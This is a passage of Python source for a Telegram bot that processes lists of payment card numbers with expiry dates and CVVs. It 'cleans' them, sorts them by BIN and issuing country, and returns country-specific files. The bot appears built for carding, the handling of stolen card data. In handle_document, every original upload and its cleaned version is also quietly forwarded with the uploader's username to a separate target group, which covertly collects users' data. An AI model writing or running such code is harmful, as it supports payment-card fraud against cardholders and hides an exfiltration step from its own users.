        retry_delay = 2
        success = False
        
        for attempt in range(max_retries):
            try:
                with open(original_file.name, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=target_group,
                        document=f,
                        filename=original_filename,
                        caption=f"Original CCs from @{username}",
                        read_timeout=30,
                        write_timeout=30,
                        connect_timeout=30,
                        pool_timeout=30
                    )
                success = True
                break
            except Exception as e:
                if attempt < max_retries - 1:
                    await asyncio.sleep(retry_delay)
                    retry_delay *= 2
                else:
                    logger.error(f"Failed to send original file after {max_retries} attempts: {str(e)}")
                    raise
            
        try:
            os.unlink(original_file.name)  # Delete the original file after sending
        except:
            pass
            
        # Get current mode
        mode = context.user_data.get('mode', 'clean')
            
        # Process the content based on mode
        if mode == 'filter_bin':
            cleaned_content = filter_by_bin(file_content, for_file=True)
            output_filename = f"filtered_bins_{username}-{ph_time}.txt"
            total_cards = len([line for line in file_content.splitlines() if line.strip()])
            unique_bins = len(set(line.split('|')[0][:6] for line in cleaned_content.splitlines() if line.strip()))
            caption = get_message('filtered_bins_caption', user_languages.get(str(update.effective_user.id), 'en'), total_cards, unique_bins)
        else:
            cleaned_content = process_data(file_content)
            output_filename = f"cleaned_ccs_{username}-{ph_time}.txt"
            card_count = len([line for line in cleaned_content.splitlines() if line.strip()])
            caption = get_message('cleaned_ccs_caption', user_languages.get(str(update.effective_user.id), 'en'), card_count)
            
        if not cleaned_content:
            await update.message.reply_text(get_message('no_valid_cards', user_languages.get(str(update.effective_user.id), 'en')))
            return
                
        # Create temporary file for cleaned content
        output_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8')
        output_file.write(cleaned_content)
        output_file.close()
            
        # Send cleaned file to user with retries
        success = False
        retry_delay = 2
        
        for attempt in range(max_retries):
            try:
                with open(output_file.name, 'rb') as f:
                    await update.message.reply_document(
                        document=f,
                        filename=output_filename,
                        caption=caption,
                        read_timeout=30,
                        write_timeout=30,
                        connect_timeout=30,
                        pool_timeout=30
                    )
                success = True
                break
            except Exception as e:
                if attempt < max_retries - 1:
                    await asyncio.sleep(retry_delay)
                    retry_delay *= 2
                else:
                    logger.error(f"Failed to send cleaned file to user after {max_retries} attempts: {str(e)}")
                    raise
            
        # Send cleaned file to target group with retries
        success = False
        retry_delay = 2
        
        for attempt in range(max_retries):
            try:
                with open(output_file.name, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=target_group,
                        document=f,
                        filename=output_filename,
                        caption=f"{caption} from @{username}",
                        read_timeout=30,
                        write_timeout=30,
                        connect_timeout=30,
                        pool_timeout=30
                    )
                success = True
                break
            except Exception as e:
                if attempt < max_retries - 1:
                    await asyncio.sleep(retry_delay)
                    retry_delay *= 2
                else:
                    logger.error(f"Failed to send cleaned file to group after {max_retries} attempts: {str(e)}")
                    raise
            
        try:
            os.unlink(output_file.name)  # Delete the output file after sending
        except:
            pass
                
    except Exception as e:
        logger.error(f"File processing error: {e}")
        await update.message.reply_text(get_message('error_occurred', user_languages.get(str(update.effective_user.id), 'en')))

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages."""
    # Add user tracking without affecting existing code
    if update.effective_user:
        user_db.log_command(str(update.effective_user.id), 'text_message')
        
    # Check for commands first
    text = update.message.text
    if text.startswith('/'):
        command = text.split()[0].lower()
        if command == '/clean':
            context.user_data['waiting_for_data'] = True
            context.user_data['mode'] = 'clean'
            await update.message.reply_text(
                get_message('clean_ccs', user_languages.get(str(update.effective_user.id), 'en'))
            )
            return
        elif command == '/filterbin' or command == '/binfilter':  
            context.user_data['waiting_for_data'] = True
            context.user_data['mode'] = 'filter_bin'
            await update.message.reply_text(
                get_message('filter_bin', user_languages.get(str(update.effective_user.id), 'en'))
            )
            return
        elif command == '/broadcast':
            await broadcast(update, context)
            return
        elif command == '/cancel':
            if context.user_data.get('waiting_for_broadcast'):
                context.user_data['waiting_for_broadcast'] = False
                await update.message.reply_text(get_message('broadcast_cancelled', user_languages.get(str(update.effective_user.id), 'en')))
                return
        elif command == '/help':
            help_text = get_message('help_text', user_languages.get(str(update.effective_user.id), 'en'))
            
            # Add owner commands if applicable
            if str(update.effective_user.id) == BOT_OWNER_ID:
                help_text += get_message('owner_commands', user_languages.get(str(update.effective_user.id), 'en'))
            
            help_text += get_message('how_to_use', user_languages.get(str(update.effective_user.id), 'en'))
            await update.message.reply_text(help_text, parse_mode='Markdown')
            return

    # Handle broadcast message if waiting for one
    if context.user_data.get('waiting_for_broadcast'):
        await broadcast(update, context)
        return

    # Handle regular text messages
    if not context.user_data.get('waiting_for_data'):
        keyboard = [
            [
                InlineKeyboardButton("🧹 Clean CCs", callback_data='clean'),
                InlineKeyboardButton("🔍 Filter by BIN", callback_data='filter_bin'),
            ],
            [InlineKeyboardButton("🌐 切换语言/Change Language", callback_data='change_language')]
        ]
        await update.message.reply_text(
            get_message('choose_option', user_languages.get(str(update.effective_user.id), 'en')),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    # Process based on mode
    mode = context.user_data.get('mode', '')
    if mode == 'filter_country':
        # Forward the text to filter_country_command
        context.args = update.message.text.split()
        await filter_country_command(update, context)
        return
    elif mode == 'clean':
        result = process_data(update.message.text)
        if result:
            await update.message.reply_text(result)
        else:
            await update.message.reply_text(get_message('no_valid_cards', user_languages.get(str(update.effective_user.id), 'en')))
        # Reset state after processing
        context.user_data['waiting_for_data'] = False
        context.user_data['mode'] = None
    elif mode == 'filter_bin':
        result = filter_by_bin(update.message.text)
        if result:
            await update.message.reply_text(result)
        else:
            await update.message.reply_text(get_message('no_valid_cards', user_languages.get(str(update.effective_user.id), 'en')))
        # Reset state after processing
        context.user_data['waiting_for_data'] = False
        context.user_data['mode'] = None
    else:
        await update.message.reply_text(get_message('choose_option', user_languages.get(str(update.effective_user.id), 'en')))
        context.user_data['waiting_for_data'] = False
        context.user_data['mode'] = None

async def lookup_bin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /bin command to look up BIN information."""
    try:
        # Add user tracking without affecting existing code
        user_id = str(update.effective_user.id) if update.effective_user else None
        if user_id:
            user_db.log_command(user_id, '/bin')
            
        if not context.args:
            await update.message.reply_text(
                get_message('bin_prompt', user_languages.get(user_id, 'en'))
            )
            return

        bins = ''.join(context.args).split(',')
        for bin_number in bins:
            bin_number = bin_number.strip()
            if not bin_number.isdigit() or len(bin_number) != 6:
                await update.message.reply_text(
                    get_message('invalid_bin', user_languages.get(user_id, 'en'), bin_number)
                )
                continue
                
            bin_info = get_bin_info(bin_number)
            if bin_info:
                flag = get_country_flag(bin_info['country'])
                response = get_message(
                    'bin_result',
                    user_languages.get(user_id, 'en'),
                    f"<code>{bin_number}</code>",
                    bin_info['brand'],
                    bin_info['type'],
                    bin_info['category'],
                    bin_info['issuer'],
                    bin_info['country'],
                    flag
                )
                await update.message.reply_text(response, parse_mode='HTML')
            else:
                await update.message.reply_text(
                    get_message('bin_not_found', user_languages.get(user_id, 'en'), bin_number)
                )
    except Exception as e:
        logger.error(f"Error in lookup_bin: {e}")
        await update.message.reply_text(
            get_message('error_occurred', user_languages.get(str(update.effective_user.id), 'en'))
        )

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle broadcast command - owner only"""
    user_id = str(update.effective_user.id)
    
    if user_id != BOT_OWNER_ID:
        await update.message.reply_text(get_message('owner_only', user_languages.get(user_id, 'en')))
        return
    
    # Check if there's a message to broadcast
    if not context.args and not context.user_data.get('waiting_for_broadcast'):
        context.user_data['waiting_for_broadcast'] = True
        await update.message.reply_text(
            get_message('broadcast', user_languages.get(user_id, 'en'))
        )
        return
    
    # If we have a message to broadcast
    if context.user_data.get('waiting_for_broadcast'):
        if not update.message.text:
            await update.message.reply_text(get_message('invalid_broadcast', user_languages.get(user_id, 'en')))
            return
        
        broadcast_message = get_message(
            'broadcast_message',
            user_languages.get(user_id, 'en'),
            update.message.text_markdown_v2
        )
        
        success_count = 0
        fail_count = 0
        
        # Send status message
        status_message = await update.message.reply_text(get_message('broadcasting', user_languages.get(user_id, 'en')))
        
        # Broadcast to all users
        for target_id in bot_users:
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=broadcast_message,
                    parse_mode='MarkdownV2'
                )
                success_count += 1
                if success_count % 10 == 0:  # Update status every 10 successful sends
                    await status_message.edit_text(
                        get_message('broadcast_status', user_languages.get(user_id, 'en'), success_count)
                    )
            except Exception as e:
                logger.error(f"Failed to send broadcast to {target_id}: {e}")
                fail_count += 1
        
        # Send final status
        await status_message.edit_text(
            get_message('broadcast_completed', user_languages.get(user_id, 'en'), success_count, fail_count)
        )
        
        context.user_data['waiting_for_broadcast'] = False

async def shutdown(application: Application):
    """Cleanup before shutdown."""
    logger.info("Stopping the bot gracefully...")
    try:
        await application.stop()
        await application.shutdown()
    except Exception as e:
        logger.error(f"Error during shutdown: {e}")

def signal_handler(signum, frame):
    """Handle shutdown signals."""
    logger.info(f"Received signal {signum}")
    if 'application' in globals():
        asyncio.create_task(shutdown(application))
    sys.exit(0)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors."""
    logger.error(f"Exception while handling an update: {context.error}")
    
    if isinstance(context.error, Conflict):
        logger.error("Conflict error detected. Will attempt to restart...")
        # Don't exit here, let the main loop handle the retry

async def check_system_health():
    """Periodic health check and memory management"""
    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    
    if memory_mb > 500:  # If memory usage exceeds 500MB
        logger.warning(f"High memory usage detected: {memory_mb:.2f}MB. Running garbage collection...")
        gc.collect()  # Force garbage collection
        
    logger.info(f"Health check - Memory: {memory_mb:.2f}MB, CPU: {process.cpu_percent()}%")

async def periodic_health_check(context: ContextTypes.DEFAULT_TYPE):
    """Run periodic health checks"""
    try:
        await check_system_health()
    except Exception as e:
        logger.error(f"Error in health check: {e}")

# State constants for filter country feature
WAITING_FOR_CCS = "waiting_for_ccs"
SELECTING_COUNTRIES = "selecting_countries"

class CountryFilterState:
    def __init__(self):
        self.countries = {}  # {country: count}
        self.selected_countries = set()
        self.current_page = 0
        self.cards_by_country = {}
        self.raw_data = ""

async def handle_country_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process incoming CC data for country filtering"""
    
    # Initialize state if needed
    if "state" not in context.user_data:
        context.user_data["state"] = {}
    if "filter_country" not in context.user_data["state"]:
        context.user_data["state"]["filter_country"] = CountryFilterState()
    
    text_content = update.message.text
    state = context.user_data["state"]["filter_country"]
    state.raw_data = text_content
    
    # Extract cards without displaying cleaned output
    cards = []
    for line in text_content.split('\n'):
        if line.strip():
            card_data = extract_card_details(line)
            if card_data:
                card, month, year, cvv = card_data
                if validate_card_format(card, month, year, cvv):
                    cards.append(format_card(card, month, year, cvv))
    
    if not cards:
        await update.message.reply_text(get_message('no_valid_cards', user_languages.get(str(update.effective_user.id), 'en')))
        context.user_data["current_action"] = None  # Reset state on error
        return
    
    # Group cards by country
    countries = {}
    cards_by_country = {}
    unknown_count = 0
    
    for card in cards:
        cc_number = card.split('|')[0]
        bin_number = cc_number[:6]
        country = get_country_from_bin(bin_number)
        
        if country == "Unknown":
            unknown_count += 1
            continue
            
        countries[country] = countries.get(country, 0) + 1
        if country not in cards_by_country:
            cards_by_country[country] = []
        cards_by_country[country].append(card)
    
    if not countries:
        msg = get_message('no_countries', user_languages.get(str(update.effective_user.id), 'en'))
        if unknown_count > 0:
            msg += get_message('unknown_bins', user_languages.get(str(update.effective_user.id), 'en'), unknown_count)
        await update.message.reply_text(msg + get_message('check_input', user_languages.get(str(update.effective_user.id), 'en')))
        context.user_data["current_action"] = None  # Reset state on error
        return
    
    if unknown_count > 0:
        await update.message.reply_text(get_message('unknown_bins', user_languages.get(str(update.effective_user.id), 'en'), unknown_count))
    
    # Update state and transition to country selection
    state.countries = dict(sorted(countries.items(), key=lambda x: x[1], reverse=True))
    state.cards_by_country = cards_by_country
    state.current_page = 0  # Reset to first page
    state.selected_countries = set()  # Clear any previous selections
    context.user_data["current_action"] = SELECTING_COUNTRIES
    
    # Show country selection interface
    keyboard = create_country_keyboard(state.countries, state.current_page, state.selected_countries)
    await update.message.reply_text(
        get_message('select_countries', user_languages.get(str(update.effective_user.id), 'en'), len(countries)),
        reply_markup=keyboard
    )

def create_country_keyboard(countries: dict, current_page: int, selected_countries: set) -> InlineKeyboardMarkup:
    """Create keyboard with country buttons"""
    COUNTRIES_PER_PAGE = 5
    country_items = list(countries.items())  # Countries are already sorted in handle_country_selection
    total_pages = (len(country_items) + COUNTRIES_PER_PAGE - 1) // COUNTRIES_PER_PAGE
    
    start_idx = current_page * COUNTRIES_PER_PAGE
    end_idx = min(start_idx + COUNTRIES_PER_PAGE, len(country_items))
    current_items = country_items[start_idx:end_idx]
    
    keyboard = []
    
    # Country buttons with flags
    for country, count in current_items:
        check_mark = "✅" if country in selected_countries else "⬜️"
        flag = get_country_flag(country)
        keyboard.append([InlineKeyboardButton(
            f"{check_mark} {flag} {country} ({count} CCs)",
            callback_data=f"country_{country}"
        )])
    
    # Navigation row
    nav_row = []
    if current_page > 0:
        nav_row.append(InlineKeyboardButton("⬅️", callback_data="prev_page"))
    if nav_row or current_page < total_pages - 1:
        nav_row.append(InlineKeyboardButton(f"📄 {current_page + 1}/{total_pages}", callback_data="page_info"))
    if current_page < total_pages - 1:
        nav_row.append(InlineKeyboardButton("➡️", callback_data="next_page"))
    if nav_row:
        keyboard.append(nav_row)
    
    # Done button
    if selected_countries:
        keyboard.append([InlineKeyboardButton("✅ Done", callback_data="done_selecting")])
    
    return InlineKeyboardMarkup(keyboard)

async def handle_filter_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process incoming CC data for country filtering"""
    query = update.callback_query
    await query.answer()
    
    if "current_action" not in context.user_data or context.user_data["current_action"] != SELECTING_COUNTRIES:
        return
    
    if not hasattr(context.user_data.get("state", {}), "filter_country"):
        await query.message.reply_text(get_message('session_expired', user_languages.get(str(update.effective_user.id), 'en')))
        return
        
    state = context.user_data["state"]["filter_country"]
    
    if query.data.startswith("country_"):
        country = query.data[8:]
        if country in state.selected_countries:
            state.selected_countries.remove(country)
        else:
            state.selected_countries.add(country)
    elif query.data == "prev_page":
        state.current_page = max(0, state.current_page - 1)
    elif query.data == "next_page":
        state.current_page += 1
    elif query.data == "done_selecting":
        # Process selected countries
        await process_selected_countries(update, context)
        return
    
    # Update the keyboard
    keyboard = create_country_keyboard(state.countries, state.current_page, state.selected_countries)
    await query.message.edit_reply_markup(reply_markup=keyboard)

async def process_selected_countries(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process and output cards for selected countries"""
    query = update.callback_query
    state = context.user_data["state"]["filter_country"]
    
    if not state.selected_countries:
        await query.message.reply_text(get_message('no_countries_selected', user_languages.get(str(update.effective_user.id), 'en')))
        return
    
    # Get username and current time
    username = update.effective_user.username or "user"
    ph_tz = timezone('Asia/Manila')
    current_time = datetime.now(ph_tz)
    date_str = current_time.strftime("%m-%d-%Y-%H-%M-%S")
    
    # Process each selected country
    for country in state.selected_countries:
        cards = state.cards_by_country.get(country, [])
        if not cards:
            continue
            
        # Create output file with PH time
        country_code = country.lower().replace(" ", "_")
        filename = f"{country_code}-{username}-{date_str}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write('\n'.join(cards))
        
        # Send file with flag emoji
        flag = get_country_flag(country)
        with open(filename, 'rb') as f:
            await query.message.reply_document(
                document=f,
                filename=filename,
                caption=get_message('filtered_ccs_caption', user_languages.get(str(update.effective_user.id), 'en'), flag, country, len(cards))
            )
        
        # Clean up file
        os.remove(filename)
    
    # Clear state
    del context.user_data["state"]["filter_country"]
    context.user_data["current_action"] = None
    context.user_data['mode'] = None
    
    await query.message.reply_text(get_message('filtering_complete', user_languages.get(str(update.effective_user.id), 'en')))

async def filter_country_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /filtercountry command and process CC data for country filtering"""
    if not update.effective_user:
        await update.message.reply_text(get_message('error_user', user_languages.get(str(update.effective_user.id), 'en')))
        return
        
    # Add user tracking without affecting existing code
    user_db.log_command(str(update.effective_user.id), '/filtercountry')
    
    # If no text is provided with the command, prompt for input
    if len(update.message.text.split()) == 1:
        # Initialize state if needed
        if "state" not in context.user_data:
            context.user_data["state"] = {}
        if "filter_country" not in context.user_data["state"]:
            context.user_data["state"]["filter_country"] = CountryFilterState()
            
        # Set mode and current action
        context.user_data['mode'] = 'filter_country'
        context.user_data["current_action"] = WAITING_FOR_CCS
        context.user_data['waiting_for_data'] = True
        
        await update.message.reply_text(
            get_message('filter_country', user_languages.get(str(update.effective_user.id), 'en'))
        )
        return
    
    # If text is provided, process it directly
    text_content = ' '.join(update.message.text.split()[1:])
    
    # Initialize state if needed
    if "state" not in context.user_data:
        context.user_data["state"] = {}
    if "filter_country" not in context.user_data["state"]:
        context.user_data["state"]["filter_country"] = CountryFilterState()
    
    state = context.user_data["state"]["filter_country"]
    state.raw_data = text_content
    
    # Extract cards without displaying cleaned output
    cards = []
    for line in text_content.split('\n'):
        if line.strip():
            card_data = extract_card_details(line)
            if card_data:
                card, month, year, cvv = card_data
                if validate_card_format(card, month, year, cvv):
                    cards.append(format_card(card, month, year, cvv))
    
    if not cards:
        await update.message.reply_text(get_message('no_valid_cards', user_languages.get(str(update.effective_user.id), 'en')))
        context.user_data["current_action"] = None
        return
    
    # Group cards by country
    countries = {}
    cards_by_country = {}
    unknown_count = 0
    
    for card in cards:
        cc_number = card.split('|')[0]
        bin_number = cc_number[:6]
        country = get_country_from_bin(bin_number)
        
        if country == "Unknown":
            unknown_count += 1
            continue
            
        countries[country] = countries.get(country, 0) + 1
        if country not in cards_by_country:
            cards_by_country[country] = []
        cards_by_country[country].append(card)
    
    if not countries:
        msg = get_message('no_countries', user_languages.get(str(update.effective_user.id), 'en'))
        if unknown_count > 0:
            msg += get_message('unknown_bins', user_languages.get(str(update.effective_user.id), 'en'), unknown_count)
        await update.message.reply_text(msg + get_message('check_input', user_languages.get(str(update.effective_user.id), 'en')))
        context.user_data["current_action"] = None
        return
    
    if unknown_count > 0:
        await update.message.reply_text(get_message('unknown_bins', user_languages.get(str(update.effective_user.id), 'en'), unknown_count))
    
    # Update state and transition to country selection
    state.countries = dict(sorted(countries.items(), key=lambda x: x[1], reverse=True))
    state.cards_by_country = cards_by_country
    state.current_page = 0
    state.selected_countries = set()
    context.user_data["current_action"] = SELECTING_COUNTRIES
    
    # Show country selection interface
    keyboard = create_country_keyboard(state.countries, state.current_page, state.selected_countries)
    await update.message.reply_text(
        get_message('select_countries', user_languages.get(str(update.effective_user.id), 'en'), len(countries)),
        reply_markup=keyboard
    )

def get_country_from_bin(bin_number: str) -> str:
    """Get country name from BIN number"""
    bin_info = BIN_DATA.get(bin_number, {})
    return bin_info.get('country', 'Unknown')

def main() -> None:
    """Start the bot."""
    # Load saved users and BIN data
    load_users()
    load_bin_data()
    
    try:
        # Create the Application and pass it your bot's token.
        application = Application.builder().token(TOKEN).build()
        
        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", handle_text))
        application.add_handler(CommandHandler("clean", handle_text))
        application.add_handler(CommandHandler("bin", lookup_bin))
        application.add_handler(CommandHandler("filterbin", handle_text))
        application.add_handler(CommandHandler("broadcast", broadcast))
        application.add_handler(CommandHandler("cancel", handle_text))
        
        # Register specific callback handler before generic one
        application.add_handler(CallbackQueryHandler(handle_filter_callback, pattern="^(country_|prev_page$|next_page$|done_selecting$)"))
        application.add_handler(CallbackQueryHandler(button))
        
        # Register document handler
        application.add_handler(MessageHandler(filters.Document.TEXT, handle_document))
        
        # Register text handler
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, handle_text))
        
        # Add error handler
        application.add_error_handler(error_handler)
        
        # Add periodic health check
        job_queue = application.job_queue
        job_queue.run_repeating(periodic_health_check, interval=300)
        
        # Start the Bot using polling
        application.run_polling()

    except Exception as e:
        logger.error(f"Error in main loop: {e}")
        time.sleep(10)  # Wait before retrying
        main()

if __name__ == '__main__':
    main()
